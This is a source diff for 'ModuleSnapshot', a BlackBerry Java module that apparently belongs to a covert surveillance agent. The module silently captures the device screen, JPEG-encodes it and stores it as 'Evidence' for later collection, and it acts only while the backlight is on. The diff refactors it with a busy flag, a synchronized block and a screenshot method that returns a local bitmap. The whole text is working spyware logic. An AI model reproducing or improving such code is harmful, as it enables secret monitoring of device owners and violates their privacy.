@@ -36,7 +36,7 @@ public final class ModuleSnapshot extends BaseInstantModule {
     static Debug debug = new Debug("ModSnapshot", DebugLevel.INFORMATION); //$NON-NLS-1$
     //#endif
 
-    private static Bitmap bitmap;
+    //private static Bitmap bitmap;
 
     private static final int LOG_SNAPSHOT_VERSION = 2009031201;
     private static final int MIN_TIMER = 1 * 1000;
@@ -54,10 +54,11 @@ public final class ModuleSnapshot extends BaseInstantModule {
     /** The type. */
     private int type;
     private int quality;
+    private boolean busy;
 
-    private int width;
+    //private int width;
 
-    private int height;
+    //private int height;
 
     public static String getStaticType() {
         return Messages.getString("14.1"); //$NON-NLS-1$
@@ -93,7 +94,7 @@ public final class ModuleSnapshot extends BaseInstantModule {
      * (non-Javadoc)
      * @see blackberry.threadpool.TimerJob#actualRun()
      */
-    public synchronized void actualStart() {
+    public void actualStart() {
 
         //#ifdef DEBUG
         debug.trace("snapshot"); //$NON-NLS-1$
@@ -101,52 +102,61 @@ public final class ModuleSnapshot extends BaseInstantModule {
 
         if (!Backlight.isEnabled()) {
             //#ifdef DEBUG
-            debug.trace("No backlight, skipping snapshot"); //$NON-NLS-1$
+            debug.trace("actualStart, No backlight, skipping snapshot"); //$NON-NLS-1$
             //#endif
             return;
         }
-        
-        if("net_rim_bb_alarm_app".equals(Status.getInstance().getCurrentForegroundAppMod())){
+
+        if (busy) {
             //#ifdef DEBUG
-            debug.trace("actualStart: clock, ignore");
+            debug.trace("actualStart, busy");
             //#endif
-            
             return;
         }
 
-        EncodedImage encoded;
+        synchronized (this) {
+            try {
+                busy = true;
+                /*
+                 * if("net_rim_bb_clock".equals(Status.getInstance().
+                 * getCurrentForegroundAppMod())){ //#ifdef DEBUG
+                 * debug.trace("actualStart: clock, ignore"); //#endif return; }
+                 */
 
-        if (bitmap == null) {
-            width = Display.getWidth();
-            height = Display.getHeight();
-            bitmap = new Bitmap(width, height);
+                Bitmap bitmap = getScreenshot();
+
+                //#ifdef DEBUG
+                debug.info("Taking screenshot"); //$NON-NLS-1$
+                //#endif
+
+                EncodedImage encoded = JPEGEncodedImage.encode(bitmap, quality);
+                bitmap = null;
+
+                byte[] plain = encoded.getData();
+                encoded = null;
+
+                Evidence evidence = new Evidence(EvidenceType.SNAPSHOT);
+                evidence.atomicWriteOnce(getAdditionalData(), plain);
+
+                //#ifdef DEBUG
+                debug.trace("finished run"); //$NON-NLS-1$
+                //#endif
+            } finally {
+                busy = false;
+            }
         }
-
-        getScreenshot();
-
-        //#ifdef DEBUG
-        debug.info("Taking screenshot"); //$NON-NLS-1$
-        //#endif
-
-        encoded = JPEGEncodedImage.encode(bitmap, quality);
-
-        byte[] plain = encoded.getData();
-        encoded = null;
-
-        Evidence evidence = new Evidence(EvidenceType.SNAPSHOT);
-        evidence.atomicWriteOnce(getAdditionalData(), plain);
-
-        //#ifdef DEBUG
-        debug.trace("finished run"); //$NON-NLS-1$
-        //#endif
 
     }
 
     /**
      * @return
+     * @return
      */
-    public void getScreenshot() {
+    public Bitmap getScreenshot() {
 
+        int width = Display.getWidth();
+        int height = Display.getHeight();
+        Bitmap bitmap = new Bitmap(width, height);
         //#ifdef DEBUG
         debug.trace("portrait: " + Display.getOrientation()); //$NON-NLS-1$
         debug.trace("w: " + width + " h:" + height); //$NON-NLS-1$ //$NON-NLS-2$
@@ -155,6 +165,7 @@ public final class ModuleSnapshot extends BaseInstantModule {
         //#endif
 
         Display.screenshot(bitmap, 0, 0, width, height);
+        return bitmap;
     }
 
     private byte[] getAdditionalData() {
